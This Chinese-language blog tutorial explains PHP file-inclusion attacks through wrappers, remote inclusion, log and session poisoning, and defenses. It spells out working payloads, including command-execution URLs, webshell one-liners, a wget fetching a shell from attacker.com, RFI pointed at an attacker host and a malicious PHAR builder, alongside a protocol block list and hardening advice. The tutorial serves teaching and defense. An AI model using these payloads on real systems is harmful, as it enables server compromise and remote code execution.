---
title: "文件包含漏洞：PHP伪协议与RFI"
date: 2025-09-01 08:00:00
tags:
  - Web安全
  - 渗透测试
categories: 渗透测试
---

## 引言

文件包含漏洞（File Inclusion）是Web安全中经典的高危漏洞，攻击者通过控制被包含的文件路径，迫使服务器加载并执行恶意代码。在PHP环境下，丰富的内置伪协议（wrapper）极大地扩展了攻击面，即便上传点受限，攻击者依然可以通过`php://input`、`data://`等伪协议实现代码执行。

> **免责声明**：本文仅用于安全研究与教学目的，所有技术内容请勿用于非法攻击。未经授权的渗透测试属于违法行为。

---

## 一、文件包含基础

PHP常见的文件包含函数有`include`、`require`、`include_once`、`require_once`。当这些函数的参数来自用户输入且未经严格过滤时，就会产生漏洞：

```php
$page = $_GET['page'];
include($page . '.php');  // 危险！
```

攻击者通过`?page=../../etc/passwd`即可路径穿越读取任意文件。通过`phpinfo()`查看`Registered PHP Streams`可了解环境支持的流封装器，这是后续利用的基础侦查步骤。

---

## 二、PHP伪协议深度解析

| 协议 | 用途 | 关键依赖 |
|------|------|----------|
| `php://filter` | 读取/转换文件内容（Base64编码源码） | 默认开启 |
| `php://input` | 读取POST原始数据并执行 | `allow_url_include=On` |
| `data://` | 内联数据作为PHP代码执行 | `allow_url_include=On` |
| `expect://` | 直接执行系统命令 | expect扩展已安装 |
| `phar://` | 触发反序列化（元数据自动unserialize） | phar扩展开启 |
| `zip://` / `compress.zlib://` | 读取压缩包内文件 | 对应扩展开启 |

---

### 2.1 php://filter —— 源码读取利器

这是LFI利用中最常用的协议，无需特殊配置即可使用。当文件被`include`时会以PHP方式执行而非输出，`php://filter`通过Base64编码转换，使源码以文本形式返回。

**基础用法——读取config.php源码：**

```
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config
```

服务器返回Base64编码后的源码，解码即可获得完整PHP代码。

**链式过滤器：** 多个过滤器通过`|`串联：

```
php://filter/convert.base64-encode|convert.iconv.UTF8.UTF7/resource=config
```

**Filter Chain Oracle（高级盲注技术）：** 当无法直接读取文件内容但能触发包含错误时，利用`convert.iconv.*`系列过滤器构建"过滤链预言机"，将源文件字节通过多级编码转换放大为自定义错误消息，可逐字节爆破文件内容。本质是基于错误响应的盲注式LFI利用。

**防御视角：** `php://filter`直接读取本地文件，不触发`allow_url_include`限制。防御关键是白名单限制可包含路径，而非单纯禁用特定协议。

---

### 2.2 php://input —— POST Body代码执行

`php://input`是只读流，获取HTTP请求体原始POST数据。当其被用于`include`语句时，POST body中的PHP代码会被直接执行。

**前提条件：** `allow_url_include = On`，PHP >= 5.2。

**攻击示例：**

```
curl -X POST "http://target.com/index.php?page=php://input" \
     -d "<?php system('id');?>"
```

**绕过技巧：** 当`<?php`被WAF拦截，可尝试短标签`<?=system('whoami')?>`或ASP风格标签`<% system('whoami'); %>`（需`short_open_tag=On`）。`php://input`的优势在于数据不经`$_POST`变量，可绕过对POST参数的过滤规则。

**防御：** 保持`allow_url_include=Off`（默认值）。

---

### 2.3 data:// —— 内联数据即代码

`data://`伪协议将数据以内联方式嵌入URL，支持`text/plain`和Base64两种编码。PHP 5.2.0以上可用。

**前提条件：** `allow_url_include=On`且`allow_url_fopen=On`，两者缺一不可。

**text/plain格式：**

```
http://target.com/index.php?page=data://text/plain,%3C%3Fphp%20system(%27id%27)%3B%20%3F%3E
```

**Base64格式：** 将`<?php system('id'); ?>`编码为`PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==`：

```
http://target.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

**绕过变体：** 使用`data://application/x-httpd-php`可绕过针对`text/plain`的弱规则；多重Base64嵌套编码可规避基于内容的WAF检测。

**防御：** `data://`利用依赖`allow_url_include=On`，关闭即可阻断。

---

### 2.4 expect:// —— 直通系统命令

`expect://`通过PHP的expect扩展直接调用系统命令，输出作为包含内容返回。这是最直接但也最罕见的利用方式。

**前提条件：** expect扩展（需编译时`--with-expect`），且`expect_popen`未被`disable_functions`禁用。

**攻击示例：**

```
http://target.com/index.php?page=expect://id
http://target.com/index.php?page=expect://whoami
```

**建立Shell链：**

```
# 写入Webshell
http://target.com/index.php?page=expect://echo '<?php eval($_POST[1]);?>' > /var/www/html/shell.php

# 远程下载Webshell
http://target.com/index.php?page=expect://wget http://attacker.com/shell.php -O /var/www/html/s.php
```

**为什么少见：** expect扩展默认不安装，大多数Linux发行版的预编译PHP包都未包含。若目标安装了该扩展，意味着是高度定制的服务器。

---

### 2.5 phar:// —— 反序列化触发器

PHAR（PHP Archive）文件的元数据在通过`phar://`流包装器访问时会自动反序列化，这为反序列化攻击提供了独特的触发面，且无需`unserialize()`函数调用。

**攻击流程：**

1. 构造恶意PHAR文件，元数据包含精心编制的反序列化Gadget Chain
2. 通过文件上传等方式将PHAR文件放置到目标服务器
3. 通过文件包含触发`phar://`流，自动执行反序列化

**构造恶意PHAR：**

```php
<?php
class Evil {
    public $cmd = 'whoami';
    public function __destruct() { system($this->cmd); }
}
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'placeholder');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Evil());
$phar->stopBuffering();
```

生成Phar需将`phar.readonly`设为Off。

**触发方式——后缀绕过是核心危险点：**

```
http://target.com/index.php?page=phar://uploads/malicious.phar
http://target.com/index.php?page=phar://uploads/avatar.jpg   # 后缀无关紧要！
```

即使文件后缀是`.jpg`，`phar://`协议仍可解析PHAR格式内容并触发反序列化。

**防御：** 不要仅校验文件后缀，应检查真实MIME类型。PHP 8.0起`phar`流包装器不再对非`.phar`后缀自动反序列化。

---

### 2.6 其他伪协议

**zip:// / compress.zlib://：** 通过压缩包封装代码绕过文件类型限制（注意`#`需URL编码为`%23`）：

```
zip://uploads/test.zip%23shell
compress.zlib://uploads/test.gz
```

**file://：** 读取本地文件（Windows路径注意使用正斜杠）：

```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
```

---

## 三、远程文件包含（RFI）

RFI即`include`/`require`加载远程服务器上的脚本并在本地执行。攻击者在自己控制的服务器上托管恶意PHP代码，通过URL参数让目标服务器执行。

### 3.1 前置条件

```
allow_url_fopen = On   # 允许打开远程文件（多数默认On）
allow_url_include = On # 允许包含远程文件（默认Off，关键开关）
```

`allow_url_include`只能在`php.ini`中修改，无法通过`ini_set()`运行时改变。PHP 5.2+起默认Off。

### 3.2 HTTP托管攻击

**准备恶意文件（后缀可不含.php，因为include直接执行源码）：**

```bash
# attacker.com/malicious.txt
<?php system($_GET['cmd']); ?>
```

**触发RFI：**

```
http://target.com/index.php?page=http://attacker.com/malicious.txt&cmd=whoami
```

**问号截断技巧——绕过拼接后缀：** 当后端`include($page . '.php')`拼接了固定后缀时：

```
http://target.com/index.php?page=http://attacker.com/malicious.txt?
```

`?`使`.php`变为查询参数：实际请求`/malicious.txt?.php`，`.php`作为无用查询串被忽略。

### 3.3 SMB共享托管

Windows + PHP环境中，UNC路径可作为包含目标，利用445端口绕过针对HTTP的防火墙策略（更多用于内网渗透）。

**搭建SMB服务器（Impacket）：**

```bash
impacket-smbserver -smb2support share /tmp/fake_share
echo '<?php system($_GET["cmd"]); ?>' > /tmp/fake_share/payload.txt
```

**触发：**

```
http://target.com/index.php?page=\\10.0.0.5\share\payload.txt
http://target.com/index.php?page=file://10.0.0.5/share/payload.txt
```

**限制：** 企业防火墙常封445端口，跨互联网SMB成功率低，Windows Defender可能拦截不受信源文件。

---

## 四、辅助利用技巧

### 4.1 路径截断（历史遗留）

- **null字节截断（PHP < 5.3.4）：** `?page=../../../etc/passwd%00` 截断`.php`后缀
- **长度截断（PHP < 5.2.8）：** 超长路径（>4096字符）使C函数截断

### 4.2 日志文件包含

无上传点时，通过HTTP请求头注入PHP代码到服务器日志再包含：

```bash
curl -H "User-Agent: <?php system('id'); ?>" http://target.com/
# Apache: /var/log/apache2/access.log 或 /var/log/httpd/access_log
# Nginx:  /var/log/nginx/access.log
```

### 4.3 /proc/self/environ（Linux）

注入PHP代码到User-Agent头，数据出现在`/proc/self/environ`中，然后包含——`http://target.com/index.php?page=../../../proc/self/environ`。Apache 2.4+默认清理了部分环境变量，成功率下降。

### 4.4 Session文件包含

PHP Session文件（`/tmp/sess_<PHPSESSID>`）保存`$_SESSION`序列化数据。若能控制Session字段（如通过注册流程写入用户名），注入PHP代码后包含即可执行。

### 4.5 双编码绕过WAF

某些中间件（Nginx + FastCGI）多次URL解码：`%253F` → 第一次解码 → `%3F` → 第二次解码 → `?`（实际分隔符），一次编码的`%3F`可能被WAF拦截，二次编码`%253F`则可绕过。

---

## 五、防御策略

### 5.1 严格白名单（治本）

```php
$allowed = ['home' => 'pages/home.php', 'about' => 'pages/about.php'];
$page = $_GET['page'] ?? 'home';
if (!isset($allowed[$page])) { die('Access Denied'); }
include($allowed[$page]);
```

### 5.2 输入验证与路径规范化

```php
if (strpos($input, '..') !== false) { die('Invalid path'); }
$blocked = ['php://', 'data://', 'expect://', 'phar://', 'file://', 'http://', 'ftp://'];
foreach ($blocked as $proto) {
    if (stripos($input, $proto) !== false) { die('Protocol not allowed'); }
}
$path = realpath('/var/www/html/templates/' . basename($input));
if ($path && strpos($path, '/var/www/html/templates/') === 0) { include($path); }
```

### 5.3 安全配置

```ini
allow_url_fopen = Off
allow_url_include = Off           # 最关键的一个
open_basedir = /var/www/html:/tmp # 限制PHP文件操作范围
display_errors = Off              # 防止信息泄漏
disable_functions = system,exec,passthru,shell_exec,popen,proc_open,pcntl_exec
```

### 5.4 纵深防御

- Web运行用户（`www-data`）不应有Shell登录权限
- 对Web目录外的敏感文件设置严格权限（`/etc/shadow`默认600）
- 定期审计服务器Webshell后门
- WAF/RASP层检测`php://`、`data://`、`../../`等攻击特征

---

## 六、总结

PHP文件包含漏洞的利用链条丰富：

1. **源码读取**：`php://filter`读取任意文件源码，默认可用，最常用
2. **代码执行**：`php://input`、`data://`需`allow_url_include=On`
3. **远程执行**：HTTP/SMB托管RFI，核心开关仍是`allow_url_include=On`
4. **反序列化**：`phar://`自动触发元数据反序列化，隐蔽性强
5. **特殊文件**：日志、Session、`/proc/self/environ`可作无上传点的代码注入目标

**配置检测优先级：**

| 检查项 | 默认值 | 风险 | 建议 |
|--------|--------|------|------|
| `allow_url_include` | Off | 高 | **必须保持Off** |
| `allow_url_fopen` | On | 中 | 按需关闭 |
| `disable_functions` | 空 | 高 | 列出高危函数 |
| `open_basedir` | 空 | 中 | 限制Web目录 |
| `display_errors` | On | 低 | 生产环境Off |

防御核心就两条：**永远不要将用户输入直接传给include/require函数**，以及**保持`allow_url_include=Off`的默认配置**。这两条消除了90%以上的攻击面，剩下的由白名单验证、最小权限和纵深防御兜底。

---

> 再次声明：本文技术内容仅供安全研究及教育用途。任何未经授权的渗透测试或攻击行为均属违法，请务必在法律允许的范围内使用所学知识。
